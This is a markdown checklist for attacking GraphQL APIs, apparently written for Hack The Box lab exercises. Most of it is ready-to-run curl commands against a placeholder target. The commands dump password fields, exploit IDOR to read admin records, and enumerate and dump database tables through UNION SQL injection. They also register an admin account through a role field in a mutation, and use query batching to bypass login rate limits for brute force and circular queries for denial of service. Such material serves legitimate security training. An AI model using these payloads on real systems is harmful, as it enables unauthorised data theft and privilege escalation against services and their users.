# Attacking GraphQL Checklist

**Rule:** Fingerprint → authenticate → enumerate schema → test every attack vector the schema reveals.

---

## Setup & Fingerprint

- [ ] Find GraphQL endpoint: `/graphql`, `/api/graphql`, `/v1/graphql`
- [ ] Fingerprint engine: `python3 graphw00f/main.py -d -f -t http://<TARGET>`
- [ ] Run security audit: `python3 graphql-cop/graphql-cop.py -t http://<TARGET>/graphql`
- [ ] Check if GraphiQL UI is exposed: browse to `/graphql` in browser

---

## Authenticate

- [ ] Find login form: `curl -s http://<TARGET>/ | grep -i "action\|form"`
- [ ] Login and save cookie: `curl -s -c /tmp/cookies.txt -X POST http://<TARGET>/ -d "username=<U>&password=<P>" -L -o /dev/null`
- [ ] Decode session to confirm role: `base64 -d` on first segment of session cookie

---

## Introspection (always run authenticated)

- [ ] List all types: `{ __schema { types { name } } }` → spot custom types (UserObject, SecretObject, etc.)
- [ ] Get fields of each custom type: `{ __type(name: "<TYPE>") { name fields { name type { name kind } } } }`
- [ ] List all queries: `{ __schema { queryType { fields { name description } } } }`
- [ ] List all mutations + args: `{ __schema { mutationType { fields { name args { name type { name kind } } } } } }`
- [ ] Get mutation input type fields: `{ __type(name: "<InputType>") { name inputFields { name description defaultValue } } }`
- [ ] Visualize in GraphQL Voyager — look for circular refs and sensitive fields

---

## Information Disclosure

- [ ] Query any sensitive fields directly (password, secret, token, role):
  ```bash
  curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{ users { username password role } }"}' | python3 -m json.tool
  ```
- [ ] For each custom type with a matching query, query all its fields
- [ ] Check for hidden queries only visible when authenticated (e.g. `secrets`)

---

## IDOR

- [ ] Identify queries with identifier arguments (username, id, uuid)
- [ ] Send query without arg → error names required arg
- [ ] Substitute a different user's identifier → data returned without error = IDOR
- [ ] Add sensitive fields (password, msg, role) to confirmed IDOR query:
  ```bash
  curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{ user(username: \"admin\") { username password role } }"}' \
    | python3 -m json.tool
  ```

---

## SQL Injection

- [ ] Test comment injection on string args: `"htb-stdnt --"` → normal result = SQLi likely
- [ ] Confirm with single quote: `"htb-stdnt'"` → SQL error in response = confirmed
- [ ] Count object fields from introspection (UserObject = 6 → UNION needs 6 columns)
- [ ] Identify which field is reflected (username = 3rd field → column 3 in UNION)
- [ ] Enumerate tables:
  ```bash
  cat > /tmp/q.json << 'EOF'
  {"query":"{ user(username: \"x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -\") { username } }"}
  EOF
  curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql -H "Content-Type: application/json" -d @/tmp/q.json | python3 -m json.tool
  ```
- [ ] Enumerate columns: replace `table_name` / `information_schema.tables` with `column_name` / `information_schema.columns WHERE table_name='<TABLE>'`
- [ ] Dump data: `GROUP_CONCAT(<column>) FROM <table>`

---

## Mutation Exploitation

- [ ] Check mutation input types for `role`, `isAdmin`, `permissions` fields
- [ ] Hash password if needed: `echo -n 'password' | md5sum`
- [ ] Register admin-role user:
  ```bash
  cat > /tmp/q.json << 'EOF'
  {"query":"mutation { registerUser(input: {username: \"pwned\", password: \"5f4dcc3b5aa765d61d8327deb882cf99\", role: \"admin\", msg: \"owned\"}) { user { username role } } }"}
  EOF
  curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql -H "Content-Type: application/json" -d @/tmp/q.json | python3 -m json.tool
  ```
- [ ] Confirm `role: "admin"` in response
- [ ] Login as new admin: `curl -s -c /tmp/admin_cookies.txt -X POST http://<TARGET>/ -d "username=pwned&password=password" -L -o /dev/null`
- [ ] Access `/admin`: `curl -s -b /tmp/admin_cookies.txt http://<TARGET>/admin | grep -i "htb\|flag"`

---

## DoS & Batching

- [ ] Test batching: send JSON array of queries → array response = batching enabled
  ```bash
  curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
    -H "Content-Type: application/json" \
    -d '[{"query":"{ user(username: \"admin\") { uuid } }"},{"query":"{ post(id: 1) { title } }"}]' \
    | python3 -m json.tool
  ```
- [ ] Identify circular type references in Voyager (e.g. UserObject ↔ PostObject)
- [ ] Test shallow circular query: `{ posts { author { posts { edges { node { author { username } } } } } } }`
- [ ] Note: batching + login mutation = rate limit bypass for brute-force

---

## Common Pitfalls

| Problem | Fix |
|---------|-----|
| Introspection misses types | Run introspection authenticated — some types are auth-gated |
| Shell quoting breaks queries | Write query to `/tmp/q.json`, use `-d @/tmp/q.json` |
| UNION returns null | Wrong column count — recount object fields from introspection |
| Login fails after mutation | Check password hash format (MD5 vs plaintext) |
| `/admin` returns 403 | Confirm role field in mutation response first, then re-login |
| Flag not in obvious fields | Check ALL custom types via `{ __schema { types { name } } }` |
